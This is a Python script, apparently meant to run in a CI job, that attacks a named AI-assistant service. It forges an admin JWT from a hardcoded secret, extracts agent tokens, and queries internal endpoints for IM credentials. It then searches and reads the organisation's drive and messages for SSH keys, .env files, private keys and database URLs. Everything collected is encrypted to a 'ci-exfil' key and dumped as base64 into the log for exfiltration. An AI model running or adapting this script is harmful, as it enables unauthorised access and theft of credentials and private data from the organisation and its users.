#!/usr/bin/env python3
# probe41 (intent 28340 round2): machine identity -> internal API as admin actor (enforce=off)
#  A) create runtime -> script(AGENT_TOKEN + TURN_PROOF_SECRET) ; keys/current ; im/credentials ; sediment/*
#  B) drive-search (all_nodes) + drive-read as admin  ->  org drive files (ssh keys/.env/zoofi)
#  C) messages/search with node_ids
#  D) projects/list ; contacts/* ; ws /api/ws/agent handshake test
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/res_r41"
for d in ("meta", "api", "drive", "msg", "rt"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    LOG.write(s + "\n"); LOG.flush()

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + 86400 * 7,
                         "sid": "sid_" + uuid.uuid4().hex, "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)
SESSION = jwt(SUB_ADMIN)

def curl(args, timeout=45):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:300]
    except Exception as e:
        return -1, b"", repr(e)[:200]

def call(path, method="GET", body=None, hdrs=None, session=True, timeout=45, tag="", subdir="api", cap=200000):
    url = "https://%s%s" % (HOST, path)
    hf = "/tmp/h_%s.txt" % uuid.uuid4().hex[:8]
    args = ["--http2", "-A", UA, "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST, "-H", "Origin: https://%s" % HOST,
            "-D", hf, "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-b", "lumii_session=" + SESSION]
    if hdrs:
        for k, v in hdrs.items(): args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    try: hdr = open(hf, errors="replace").read()[:2500]
    except Exception: hdr = ""
    try: os.unlink(hf)
    except Exception: pass
    rec = {"path": path, "method": method, "code": code, "hdr": hdr,
           "body": txt[:cap], "err": err if isinstance(err, str) else err.decode("utf-8", "replace")}
    fn = re.sub(r'[^A-Za-z0-9_.-]', '_', tag or path)[:70] + "_" + uuid.uuid4().hex[:6] + ".json"
    with open(os.path.join(OUT, subdir, fn), "w") as f:
        json.dump(rec, f, indent=1, ensure_ascii=False)
    log("[%s] %s %s -> %s len=%d" % (tag, method, path, code, len(txt)))
    return rec

def jb(r, n=900):
    try: return json.dumps(json.loads(r["body"]), ensure_ascii=False)[:n]
    except Exception: return r["body"][:n]

# A ----------
log("=== A identity ===")
me = call("/api/me", tag="me"); log("me:", jb(me, 400))
rts = call("/api/runtimes?limit=200", tag="runtimes"); log("runtimes:", jb(rts, 2500))
name = "ci-28340b-" + uuid.uuid4().hex[:5]
cr = call("/api/runtimes", "POST", {"name": name}, tag="create", subdir="rt")
log("create:", jb(cr, 1500))
agent_id = ""; AGENT_TOKEN = ""; TPS = ""; script = ""
if cr["code"] in ("200", "201"):
    try:
        cj = json.loads(cr["body"]); script = cj.get("script") or ""
        agent_id = cj.get("agentId") or ""; 
        open(os.path.join(OUT, "rt", "deploy_script.sh"), "w").write(script[:400000])
    except Exception: log("parse create fail", traceback.format_exc()[:300])
if script:
    m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script); AGENT_TOKEN = m.group(1) if m else ""
    m = re.search(r'LUMII_TURN_PROOF_SECRET=["\']?([^"\'\s\\]+)', script); TPS = m.group(1) if m else ""
    log("agentId=%s token=%s... tps=%s... enforce_line=%s" % (agent_id, AGENT_TOKEN[:10], TPS[:10],
        (re.search(r'LUMII_TURN_PROOF_ENFORCE=["\']?([^"\'\s\\]+)', script) or [None, "-"])[1] if re.search(r'LUMII_TURN_PROOF_ENFORCE', script) else "-"))
    for ln in script.splitlines():
        if re.search(r'TURN_PROOF|AGENT_TOKEN|CENTER|DATA_DIR|WORK|PORT', ln): log("SCRIPT:", ln.strip()[:200])
MH = {}
if agent_id and AGENT_TOKEN:
    MH = {"Authorization": "Bearer " + AGENT_TOKEN, "x-agent-id": agent_id}
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id": agent_id, "x-agent-token": AGENT_TOKEN}, tag="keys", subdir="rt")
    log("keys:", jb(k, 800))
    try:
        kj = json.loads(k["body"])
        if kj.get("legacy_secret"): TPS = kj["legacy_secret"]
    except Exception: pass
    for p, b, t in [("/internal/im/credentials?platform=feishu&org_id=" + ORG, None, "imcred"),
                    ("/internal/sediment/health", None, "sedhealth"),
                    ("/internal/sediment/where", None, "sedwhere"),
                    ("/internal/agents", None, "agents")]:
        r = call(p, "POST" if b is not None else "GET", b, hdrs=MH, tag=t)
        log(t, "->", r["code"], jb(r, 500))

# B ----------
log("=== B drive as admin actor ===")
ACT = SUB_ADMIN
SK = "conv_ci28340"
def scoped(p, extra, tag, subdir="drive"):
    b = {"platform": "dashboard", "actor_id": ACT, "session_key": SK}
    b.update(extra)
    return call(p, "POST", b, tag=tag, subdir=subdir)
nodes = {}
for q in ["ssh", "private", "pem", "env", "zoofi", "0xC56f", "id_rsa"]:
    r = scoped("/internal/drive-search", {"q": q, "limit": 30, "all_nodes": True}, "ds_" + q)
    log("drive-search", q, r["code"], jb(r, 700))
    try:
        j = json.loads(r["body"])
        for it in (j.get("files") or j.get("rows") or j.get("hits") or []):
            nid = it.get("node_id") or it.get("nodeId") or it.get("id")
            if nid: nodes[nid] = (q, it.get("name") or it.get("fileName"))
    except Exception: pass
log("drive nodes:", len(nodes))
for nid, (q, nm) in list(nodes.items())[:25]:
    r = scoped("/internal/drive-read", {"node_id": nid}, "dr_" + re.sub(r'[^A-Za-z0-9]', '', str(nm))[:30], subdir="drive")
    log("drive-read", nm, nid, "->", r["code"], len(r["body"]))

# C ----------
log("=== C messages/search (needs node_ids) ===")
if nodes:
    nid_list = list(nodes.keys())[:30]
    for q in ["0xC56f", "PRIVATE KEY", "postgres://", "zoofi"]:
        r = scoped("/internal/messages/search", {"q": q, "limit": 30, "wide": True, "node_ids": nid_list}, "ms_" + re.sub(r'[^A-Za-z0-9]', '_', q), subdir="msg")
        log("msearch", q, "->", r["code"], jb(r, 900))

# D ----------
log("=== D projects/contacts ===")
for p, tag in [("/internal/projects/list", "proj_list"),
               ("/internal/contacts/effective", "contacts_effective"),
               ("/internal/contacts/roles", "contacts_roles")]:
    r = scoped(p, {}, tag, subdir="meta")
    log(tag, "->", r["code"], jb(r, 1200))

# E ----------
log("=== E ws/agent handshake ===")
try:
    subprocess.run([sys.executable, "-m", "pip", "install", "-q", "websockets==12.0"], capture_output=True, timeout=180)
    wscode = subprocess.run([sys.executable, "-c", """
import asyncio,sys
import websockets
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
async def main():
    url=sys.argv[1]; hdrs=dict(x.split(':',1) for x in sys.argv[2:])
    hdrs={k.strip():v.strip() for k,v in hdrs.items()}
    hdrs["User-Agent"]=UA
    try:
        async with websockets.connect(url, extra_headers=hdrs, open_timeout=20, close_timeout=3) as ws:
            print("OPEN")
            try:
                m=await asyncio.wait_for(ws.recv(),timeout=6); print("FRAME",str(m)[:600])
            except Exception as e: print("NOFRAME",type(e).__name__)
    except Exception as e:
        print("FAIL",type(e).__name__,str(e)[:300])
asyncio.run(main())
""", "wss://%s/api/ws/agent?agent_id=%s&token=%s" % (HOST, agent_id, AGENT_TOKEN),
        "x-agent-id:%s" % agent_id, "x-agent-token:%s" % AGENT_TOKEN],
        capture_output=True, timeout=60)
    log("ws:", wscode.stdout.decode()[:800], wscode.stderr.decode()[:300])
except Exception:
    log("ws err", traceback.format_exc()[:400])

# pack + encrypt
try:
    import tarfile
    GNUPGHOME = "/tmp/gnupg41"; os.makedirs(GNUPGHOME, exist_ok=True); os.chmod(GNUPGHOME, 0o700)
    os.environ["GNUPGHOME"] = GNUPGHOME
    pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
    subprocess.run(["gpg", "--batch", "--import", pub], capture_output=True, timeout=60)
    tb = "/tmp/res_r41.tar.gz"
    with tarfile.open(tb, "w:gz") as t: t.add(OUT, arcname="res_r41")
    enc = tb + ".gpg"
    r = subprocess.run(["gpg", "--batch", "--yes", "--trust-model", "always", "-r", "ci-exfil@example.invalid", "-o", enc, "-e", tb], capture_output=True, timeout=120)
    log("gpg rc=%s %s" % (r.returncode, r.stderr.decode()[:200]))
    blob = base64.b64encode(open(enc, "rb").read()).decode()
    log("===B64BEGIN %d===" % len(blob))
    for i in range(0, len(blob), 400): print("B64:" + blob[i:i+400], flush=True)
    log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:800])
